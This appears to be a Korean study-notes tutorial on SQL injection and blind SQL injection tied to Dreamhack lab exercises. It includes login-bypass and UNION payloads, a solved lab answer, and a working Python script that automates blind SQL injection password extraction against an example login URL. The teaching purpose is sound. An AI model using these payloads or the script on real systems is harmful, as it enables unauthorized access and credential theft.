# 서론

**DBMS에서 사용하는 쿼리를 임의로 조작하여 데이터베이스의 정보를 획득**하는 기법을 `SQL Injection`이라고 한다.

여기서 `Injection` 공격이란 **이용자의 입력값이 애플리케이션의 처리 과정에서 구조나 문법적인 데이터로 해석되어 발생하는 취약점**을 의미한다.

이전에 공부한 `XSS`, `CSRF` 취약점과 유사하게, 이용자의 입력을 코드로 실행할 수 있을 때 발생한다고 쉽게 이해할 수 있다.

로그인에 `username`과 `password`를 필요로 하는 웹 서비스를 예로 들어보자.

**"`username`이 DreamHack이고, `password`가 pw인 계정으로 로그인하겠습니다."** 라는 요청을 보내면, DBMS는 데이터베이스에서 `username`과 `password`의 일치 여부를 검사한 후 로그인 여부를 결정할 것이다.

그런데 만약 공격자가 쿼리문을 조작하여 `password` 없이, **"`username`이 admin인 계정으로 로그인하겠습니다."** 라는 요청을 보내면, DBMS는 `username`과 `password`의 일치 여부 없이 `username`이 admin인 계정을 조회한 후 로그인 결과를 반환할 것이다.

이렇게 DBMS에서 사용하는 쿼리문인 `SQL`을 삽입하는 공격을 `SQL Injection`이라고 한다.

# SQL Injection

SQL은 DBMS에 데이터를 질의하는 언어이다. 웹 서비스는 **이용자의 입력을 SQL 구문에 포함하여 요청**하는 경우가 있다.

예를 들어, 로그인 시에 SQL 구문에 `ID`와 `PW`를 포함하거나, 게시글의 제목과 내용을 SQL 구문에 포함하는 경우가 있을 수 있다.

아래의 쿼리를 한번 살펴보자.

```
/*
아래 쿼리 질의는 다음과 같은 의미를 가지고 있습니다.
- SELECT: 조회 명령어
- *: 테이블의 모든 컬럼 조회
- FROM accounts: accounts 테이블 에서 데이터를 조회할 것이라고 지정
- WHERE user_id='dreamhack' and user_pw='password': user_id 컬럼이 dreamhack이고, user_pw 컬럼이 password인 데이터로 범위 지정
즉, 이를 해석하면 DBMS에 저장된 accounts 테이블에서 이용자의 아이디가 dreamhack이고, 비밀번호가 password인 데이터를 조회
*/
SELECT * FROM accounts WHERE user_id='dreamhack' and user_pw='password'
```

해당 쿼리문은 로그인 과정에서 `user_id`와 `user_pw` 컬럼 값을 **이용자의 입력에서 가져와 SQL 구문에 포함**시킨다.\
(참고로 해당 쿼리문의 리턴 값은 `user_id`와 `user_pw`를 가지는 행의 모든 컬럼(`*`)을 리턴하는 것이다.)

따라서 **이용자의 입력이 SQL 구문에 포함되기 때문에** `SQL Injection` 취약점이 발생하게 되고, 이 경우 쿼리문을 조작하여 인증을 우회하거나 데이터베이스의 정보를 유출할 수 있다.

SQL Injection을 통해 `user_id='admin'`인 계정으로 로그인하기 위해서는 `'admin'` 계정의 `user_pw`를 비교하는 구문을 제외하도록 조작하는 방법이 있다.

예를 들어, `SELECT * FROM accounts WHERE user_id='admin'`와 같은 쿼리문이 동작하도록 조작하는 것이다.

이를 위해서 `OR 1` 구문이 포함되게 하여 `SELECT`에서 모든 행을 가져오게 하거나, SQL에서 주석으로 사용되는 `--`가 추가되게 하여, `user_pw`를 비교하는 부분을 주석처리 하도록 하면 된다.

1. `admin' OR 1 --`

2. `admin' --`

`Blind SQL Injection`을 살펴보고 난 후, 아래에서 [실습 모듈](https://learn.dreamhack.io/labs/3e1c32f4-ec7e-42f6-ae07-01c33251bb4b)과 함께 더욱 더 자세히 설명하도록 하겠다.

# Blind SQL Injection

앞에서 SQL Injection을 통해 쿼리문을 조작하여 관리자 계정의 로그인 인증을 우회하는 방법을 살펴보았다.

해당 공격은 인증 우회 이외에도, 데이터베이스에 저장된 데이터를 알아낼 수 있다.

예를 들어 앞에서는 관리자 계정으로 인증을 우회하여 로그인만 성공했지만, 관리자 계정의 비밀번호 값인 `user_pw`를 알아낼 수도 있다.

이때 사용할 수 있는 공격 기법이 `Blind SQL Injection`이다. 

해당 공격은 스무고개 게임과 유사한 방식으로 데이터를 알아낼 수 있다.

예를 들어, 아래의 경우처럼 쿼리문에 대한 답변이 `True`일 때 까지 계속 질문을 하며 단계적으로 정답을 찾아나가는 것이다.

- Question #1. dreamhack 계정의 비밀번호 첫 번째 글자는 'x' 인가요?

  - Answer. 아닙니다

- Question #2. dreamhack 계정의 비밀번호 첫 번째 글자는 'p' 인가요?

  - **Answer. 맞습니다 (첫 번째 글자 = p)**

- Question #3. dreamhack 계정의 비밀번호 두 번째 글자는 'y' 인가요?

  - Answer. 아닙니다.

- Question #4. dreamhack 계정의 비밀번호 두 번째 글자는 'a'인가요?

  - **Answer. 맞습니다. (두 번째 글자 = a)**


이렇게 비밀번호의 최대 길이까지 계속 반복하여 쿼리문을 요청하면 비밀번호의 전체값을 알아낼 수 있을 것이다.

이렇게 한 단계씩 쿼리문을 날려서 확인하는 이유는, 앞에서 본 로그인 기능에서 `username`을 조작을 통한 인증 우회로 관리자 계정에 로그인 하는 것은 가능하지만, 웹 서비스에서 화면에 `user_pw`를 출력해주는 기능은 존재하지 않기 때문이다.

따라서 비밀번호 한자리씩 쿼리문을 통해 `True/False`결과를 확인하며 전체 비밀번호를 유추해야 하는 것이다.

## Blind SQL Injection example

```
# 첫 번째 글자 구하기
SELECT * FROM user_table WHERE uid='admin' and substr(upw,1,1)='a'-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and substr(upw,1,1)='b'-- ' and upw=''; # True

# 두 번째 글자 구하기
SELECT * FROM user_table WHERE uid='admin' and substr(upw,2,1)='d'-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and substr(upw,2,1)='e'-- ' and upw=''; # True 
```

위 쿼리문은 Blind SQL Injection 기법을 사용하여 `uid = 'admin'`인 행의 `upw`를 유추하는 쿼리문이다.

해당 쿼리문에서 `-- ' and upw='';` 부분을 보면, 원래는 `upw`를 이용자에게 입력 받는데, 이 부분을 입력하지 않고 `uid` 입력을 통해 쿼리문을 조작하여 주석처리한 것을 알 수 있다.

그리고 `substr` 함수가 쓰였는데, 해당 함수에 대해 간단히 알아보자.

```
substr(string, position, length)

substr('ABCD', 1, 1) = 'A'
substr('ABCD', 2, 2) = 'BC'
```

첫 번째 줄은 해당 함수의 원형이고, 그 다음 줄은 해당 함수의 사용 예시이다.

`string`은 검증할 문자열, `position`은 문자열의 시작 위치(`1-index`), `length`는 리턴할 문자열의 길이이다.

그럼, 다시 예제를 보면, `uid` 입력 값에 `admin' and substr(upw, 시작위치, 1)='비교할 문자'--'를 입력해준 것을 알 수 있다.

리턴할 문자열의 길이를 `1`로 고정하고, `position`과 비교할 문자를 변경하며 쿼리문을 발생시키는데,

`substr`의 리턴 값이 비교할 문자와 같아지는 경우 쿼리문의 전체 결과 값이 `True`가 되기 때문에, `True`인 경우 계속 시작 위치를 한 칸씩 뒤로 이동하며 비밀번호의 각 자리를 유추할 수 있다.

`substr` 이외에도 각 DBMS에서 제공하는 내장 함수를 잘 이용하여 원하는 데이터를 추출할 수 있다.

## [실습](https://learn.dreamhack.io/labs/3e1c32f4-ec7e-42f6-ae07-01c33251bb4b)

앞에서 설명한 `SQL Injection`, `Blind SQL Injection` 기법을 실제 실습을 통해서 공부해보자.

### 1. SQL Injection

<img width="810" alt="image" src="https://github.com/user-attachments/assets/e9062324-c62a-44da-b361-8b0671a4ea05">

실습 모듈에서는 `uid`와 `upw`를 입력받은 뒤, DBMS에 조회하기 위한 쿼리를 생성한 뒤 실행하는 기능을 수행합니다. 

실습 모듈에서 사용하는 user_table은 다음과 같이 구현되어 있으며, 내부적으로 SQLite를 사용한다. 실습 목표는 아래의 두 목표가 있다.

|uid|upw|
|-|-|
|guest|guest|
|admin|**********|

쿼리문은 `SELECT uid FROM user_table WHERE uid='' and upw=''`이며, 사용자의 입력을 `uid`와 `upw`에 문자열('')로 감싸서 대입해준다.

### 목표 1. uid=guest, upw=guest를 입력해 query 결과를 확인하세요.**

첫 번째 목표를 달성하기 위해서는 그냥 `uid`와 `upw` 필드에 `guest`를 입력해주면 되고, 아래와 같이 `Query Result`로 `uid` 값이 출력되는 것을 확인할 수 있다.

<img width="793" alt="image" src="https://github.com/user-attachments/assets/59c67bc9-591a-4a1b-b22d-fd70da4a72be">

### 목표 2. SQL 인젝션 공격을 통해 admin의 비밀번호를 출력하세요.**

해당 쿼리문에는 사용자의 입력이 쿼리문 내에 포함되어 있기 때문에, `SQL Injection` 공격으로 로그인 인증을 우회할 수 있다.

`uid`에 `admin'--`을 입력해주고, 주석처리 되는 비밀번호에는 아무 값이나 입력해주어도 로그인에 성공하게 된다.

<img width="779" alt="image" src="https://github.com/user-attachments/assets/9d2cf226-97bf-40b9-b4f1-967a8ad56395">

하지만, 여기서 목표는 admin의 `upw`를 출력하는 것이다. 만약 일반적인 웹 서비스의 로그인 화면이었다면 SQL Injection 만으로는 한번에 `upw`를 화면에 출력할 수 없고, Blind SQL Injection 기법을 활용해야 하겠지만,

이번 실습 모듈에서는 **Query Result** 란에 `SELECT uid`로 리턴 받은 `WHERE`을 만족하는 행의 `uid` 컬럼 값을 출력해준다.

만약 `uid`에 `admin' OR 1 --`을 입력해주면, 모든 `uid`가 만족되어 아래와 같이 `guest`도 출력되는 것까지 확인할 수 있다.

<img width="765" alt="image" src="https://github.com/user-attachments/assets/6741dc2a-cec3-4ec1-9c95-8ce888247afd">

그럼 이제 `upw`를 어떻게 출력할지 생각해보아야 하는데, 나중에 배울 `UNION` 쿼리문을 통해 `upw` 컬럼 값까지 리턴 값에 포함하는 방법을 사용할 수 있다.

`UNION`은 SQL에서 여러 `SELECT` 쿼리의 결과를 결합하여 하나의 결과 집합으로 반환하는 연산자라고 이해하면 된다.

`SELECT`를 통해 특정 컬럼의 값을 리턴해주는데, `UNION`으로 두 `SELECT` 쿼리문을 엮으면, 두 리턴 값에서 중복을 제거한 합집합을 만들어 리턴한다고 생각하면 된다.

그렇다면 쿼리문을 조작해서 `SELECT upw`를 `UNION`으로 엮으면, Query Result에서 `upw` 까지 출력 결과에 포함할 수 있을 것이다.

`uid` 필드에 `admin' UNION SELECT upw FROM user_table WHERE uid='admin' --`을 입력해주면, `uid`가 admin인 행의 `upw` 값까지 리턴되게 될 것이다.

<img width="781" alt="image" src="https://github.com/user-attachments/assets/2dc31247-5c34-4ef6-8613-49fd38f08fdc">

만약, `admin' UNION SELECT upw FROM user_table WHERE 1 --`을 입력해주면, 모든 행의 `upw`를 가져오게 되어 아래에서처럼 guest의 `upw`도 출력되어 중복을 제거하고 guest 하나만 추가되어 출력된다.

<img width="785" alt="image" src="https://github.com/user-attachments/assets/7e99a831-cf3a-481d-be8c-7cf543996cbb">

### 2. Blind SQL Injection

우측 실습 모듈의 구현은 이전 실습 모듈과 거의 완전히 유사하나, 더 이상 Query Result에서 `SELECT`의 리턴 값을 직접적으로 보여주지 않는다. 

따라서, Blind SQL Injection 공격을 수행해 정보를 추출해야 하므로, `substr` 등 앞에서 다룬 내용을 조합하여 Blind SQL Injection 공격을 수행해보자.

비밀 번호의 힌트는 5글자의 영어 소문자 과일이며, 목표는 아래와 같다.

### 목표 1. **uid=guest, upw=guest를 입력해 guest로 로그인해보세요.**

SQL Injection의 목표 1.과 동일하게 그냥 `uid`, `upw`에 `guest`를 입력해주면 된다.

### 목표 2. **admin으로 로그인 할 수 있는 입력을 작성하세요.**

이것도 SQL Injection의 목표 2.와 동일하게 `uid`에 `admin' --`을 입력해주면 된다.

### 목표 3. **Blind SQL 인젝션 공격을 통해 admin의 비밀번호로 로그인하세요.**

이제 `Blind SQL Injection`기법을 통해 `substr` 함수를 활용하여 `upw` 값을 한자리씩 찾아가면 된다.

`admin' AND substr(1, 1) = 'a'`부터 `True`가 리턴되는 Query Result의 Login Success! 결과가 나올 때 까지, 계속 점진적으로 `position`과 비교 문자를 바꿔가며 검증해보면 된다.

첫 번째 문자열은 `admin' and substr(1, 1) = 'b'`로 구할 수 있었고,

<img width="780" alt="image" src="https://github.com/user-attachments/assets/ecc43129-2253-43bc-a28f-d38199099c7f">

두 번째 문자열은 `admin' and substr(2, 1) = 'e'`,

세 번째 문자열은 `admin' and substr(3, 1) = 'r'`로 구할 수 있는 것을 통해 berry일 것이라고 예측한 후, 

`admin' and substr(4, 1) = 'r'`, `admin' and substr(5, 1) = 'y'`를 확인해보며 `upw`가 berry임을 확인할 수 있었다.

참고로, 쿼리문의 `SELECT`, `AND` 등은 전부 소문자로 써도 되긴 한다.

## Blind SQL Injection 공격 스크립트

Blind SQL Injection 기법은 한 바이트씩 비교하여 공격하는 방식이기 때문에, 다른 공격에 비해 많은 시간을 들여야 하는 문제가 있다.

이런 문제를 해결하기 위해서 해결책으로는 공격을 자동화하는 스크립트를 작성하는 방법이 있다.

이러한 자동화 공격 스크립트를 작성하기 위해서 [requests](https://docs.python-requests.org/en/master/)라는 모듈을 활용할 수 있다.

파이썬은 `HTTP` 통신을 위한 다양한 모듈이 존재하는데, `requests` 모듈은 다양한 메소드를 이용하여 `HTTP Request`를 보내고 응답 또한 확인할 수 있다.

아래 코드는 `requests` 모듈을 통해 `HTTP GET` 메소드 통신을 하는 예제 코드이다.

```
import requests

url = 'https://dreamhack.io/'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'
}

params = {
    'test': 1,
}

for i in range(1, 5):
    c = requests.get(url + str(i), headers=headers, params=params)
    print(c.request.url)
    print(c.text)
```

`requests.get`은 `GET` 메소드를 사용하여 `HTTP Request`를 보내는 함수로 `URL`, `Header`, `Parameter`와 함께 요청을 전송할 수 있다.

참고로, `GET` 메소드의 요청에 담긴 `Parameter`는 `URL`에 담겨서 `?paramter=` 형식으로 전달되므로, 파라미터의 내용이 `URL`에 노출되게 된다.

`print(c.requests.url)`의 출력 값은 `https://dreamhack.io/{1~5}?test=1`이 될 것이며, 

`print(c.text)`는 `HTTP Reqeust`에 대한 응답의 본문 내용을 문자열 형식으로 반환한다. 서버가 클라이언트에 응답하는 `HTML`, `JSON` 또는 다른 형식의 데이터를 포함할 수 있다.

또한 아래 코드는 `requests` 모듈을 통해 `HTTP POST` 메소드 통신을 하는 예제 코드이다.

```
import requests

url = 'https://dreamhack.io/'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'
}

data = {
    'test': 1,
}

for i in range(1, 5):
    c = requests.post(url + str(i), headers=headers, data=data)
    print(c.text)
```

`requests.post`는 `POST` 메소드를 사용해 `HTTP Request`를 보내는 함수로 `URL`, `Header`, `Body`와 함께 요청을 전송할 수 있다.

`GET`과의 차이 중 하나는, `URL`에 드러나는 `Parameter` 대신 `HTTP Body`에 포함되는 `data`를 `URL`에 노출하지 않고 전송한다는 것이다.

### 참고 : `GET`, `POST` 차이점

| 분류                  | GET (params)                                  | POST (data)                               |
|-----------------------|-----------------------------------------------|--------------------------------------------|
| 전송 위치             | URL 쿼리 문자열                               | HTTP 요청 본문                             |
| 보안                  | URL에 노출되므로 상대적으로 덜 안전            | URL에 노출되지 않으므로 더 안전             |
| 데이터 길이 제한      | 있음 (브라우저/서버에 따라 다름)               | 없음 (일반적으로 제한 없음)                |
| 주 사용 목적          | 데이터 조회, 검색 등 (읽기 전용)               | 데이터 생성, 수정, 삭제 등                 |
| 캐싱                  | 일반적으로 캐싱됨                             | 캐싱되지 않음                              |
| Idempotency (멱등성)  | 멱등성 있음                                    | 멱등성 없음 (대부분의 경우)                |

## Blind SQL Injection 자동화 공격 스크립트 작성

`HTTP GET request`로 파라미터를 전달받는 홈페이지에 Blind SQL Injection을 시도한다고 가정해보자. 

로그인 과정에서 사용자에게서 입력되는 아이디와 비밀번호는 출력 가능한 아스키 범위의 문자이기 때문에, Python의 `string` 모듈에 있는 `string.printable`를 이용하여 입력 범위를 지정할 수 있다.

아래의 코드를 한번 살펴보자.

```
#!/usr/bin/python3
import requests
import string

# example URL
url = 'http://example.com/login'

params = {
    'uid': '',
    'upw': ''

}
# ascii printables
tc = string.printable

# 사용할 SQL Injection 쿼리
query = '''admin' and substr(upw,{idx},1)='{val}'-- '''
password = ''

# 비밀번호 길이는 20자 이하라 가정
for idx in range(0, 20):
    for ch in tc:
        # query를 이용하여 Blind SQL Injection 시도
        params['uid'] = query.format(idx=idx+1, val=ch).strip("\n")
        c = requests.get(url, params=params)
        print(c.request.url)
        # 응답에 Login success 문자열이 있으면 해당 문자를 password 변수에 저장
        if c.text.find("Login success") != -1:
            password += ch
            break
print(f"Password is {password}")
```

먼저, `url`을 정해주고, `params`를 아이디와 비밀번호를 나타내는 `uid`와 `upw`로 지정해준다.

그 후, `tc = string.printable`을 통해 `uid`와 `upw`의 입력 범위를 정해주고, 

공격에 사용할 SQL Injection 쿼리문을 `query = '''admin' and substr(upw,{idx},1)='{val}'-- '''`로 지정해준다. 

`uid` 파라미터로 전달될 쿼리문은 `?uid=admin' and substr(upw, {1~20}, 1) = '{출력 가능한 아스키 문자}' --` 값이 되기 때문에, 반복문을 통해 Blind SQL Injection을 수행하면 `admin` 계정의 비밀번호를 찾을 수 있을 것이다.

### 참고

참고로 여기서 문자열을 지정할 때 `"`로 감싸는게 아닌 `'''`로 감싼 이유는, 문자열 내부에서 `'`가 사용되기 때문이다.

`'` 또는 `"`가 문자열 내부에서 사용될 때는 **Multi-line String**을 지정하는 `'''`를 사용하여 문자열을 감싸주고 내부에서 사용하거나,

이스케이프 문자 `\`를 사용하여 `\'` 또는 `\"`로 쓰면 된다.

그리고 `{idx}`와 `{val}`는 **자리표시자**로, 만약 추가적인 사용 없이 그냥 `query`를 출력하면 문자열 그대로 `{idx}`, `{val}`으로 출력되겠지만, 코드 아래 부분에서처럼 `str.format()`메서드로 해당 자리표시자의 값을 지정해줄 수 있다.

참고로 `f-string`은 자리표시자와 비슷하지만, `str.format()`을 사용하여 동적으로 값을 지정해줄 수 없고, 선언과 함께 문자열이 고정되어서 `idx`와 `val` 변수가 미리 선언되어 있어야 하고, `f-string` 선언 후 `idx`와 `val` 변수에 저장된 값이 바뀌어도 `f-string`에는 적용되지 않는다.

### 다시 돌아와서..

Blind SQL Injection을 통해 찾은 값들을 한 바이트씩 더해줄 수 있도록 `password` 변수를 선언해주고,

비밀번호 길이를 20자로 가정한 후, `tc`의 문자에 대해 하나씩 `params['uid']`에 대입할 파라미터의 값을 `query.format(idx=idx+1, val=ch).strip("\n")`으로 지정해준 후,

`HTTP GET Request`를 발생시킨다.

만약 응답인 `c.text`에 `"Login success"`라는 문자열이 있으면 `-1`이 아닌, 해당 문자열이 처음으로 나타나는 위치의 인덱스 값을 반환하므로 `password`에 현재 비밀번호의 문자인 `ch`를 더해준 후 다음 바이트로 이동하여 비밀번호의 끝자리까지 구해준다.

마지막의 `print(f"Password is {password}")` 부분을 제외하고, 예제 부분에서 `printf(c.request.url)`의 출력 값은 아래와 같을 것이다.

```
$ python3 bsqli.py
http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%270%27--+&upw=
http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%271%27--+&upw=
http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%272%27--+&upw=
http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%273%27--+&upw=
http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%274%27--+&upw=
```

특수 문자들을 `URL`에 사용할 수 있도록 인코딩 되어서 위와 같은 형식으로 나오고, `uid` 파라미터에는 지정해준 쿼리문이 잘 전달되고 마지막에 주석인 `--`과 함께 `upw`에는 아무 파라미터도 전달되지 않는 것을 확인할 수 있다.

그럼 여기까지 `인젝션`과 `SQL Injection`, 그리고 이를 응용하는 공격 기법인 `Blind SQL Injection`에 대해서 공부해보았다. 

실습 모듈에서는 데이터를 조회하는 `SELECT`만을 사용했지만, `UPDATE`와 `DELETE`에서 SQL Injection이 발생하면 임의 데이터를 갱신하고, 삭제할 수도 있다.
